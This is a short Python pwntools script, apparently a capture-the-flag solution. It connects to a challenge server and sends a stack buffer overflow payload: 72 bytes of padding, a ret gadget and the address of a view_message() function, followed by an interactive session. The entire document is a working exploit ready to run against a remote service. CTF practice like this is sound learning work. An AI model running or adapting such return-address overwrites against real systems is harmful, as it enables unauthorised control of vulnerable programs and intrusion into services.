from pwn import *

p = remote("challs.nusgreyhats.org", 30211)

payload  = b"A"*72 # Offset
payload += p64(0x40101a) # ret gadget
payload += p64(0x40138e) # view_message()

p.sendline(payload)
p.interactive()
